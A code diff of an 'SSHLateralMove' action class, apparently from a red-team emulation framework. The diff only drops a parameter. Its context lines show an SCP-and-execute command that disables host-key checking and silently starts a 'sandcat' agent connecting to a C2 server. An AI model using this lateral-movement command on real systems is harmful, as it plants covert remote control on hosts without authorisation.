@@ -4,7 +4,7 @@ from config.settings import settings
 
 
 class SSHLateralMove(LowLevelAction):
-    def __init__(self, agent: Agent, hostname: str, high_level_action_id: str):
+    def __init__(self, agent: Agent, hostname: str):
         self.hostname = hostname
         command = (
             f"scp -o StrictHostKeyChecking=no "
@@ -16,10 +16,4 @@ class SSHLateralMove(LowLevelAction):
             f"'nohup ./sandcat_tmp.go -server {settings.c2_server} -group red 1>/dev/null 2>/dev/null &'"
         )
         payloads = ["sandcat.go-linux"]
-        super().__init__(
-            agent,
-            command,
-            payloads,
-            command_delay=3,
-            high_level_action_id=high_level_action_id,
-        )
+        super().__init__(agent, command, payloads, command_delay=3)
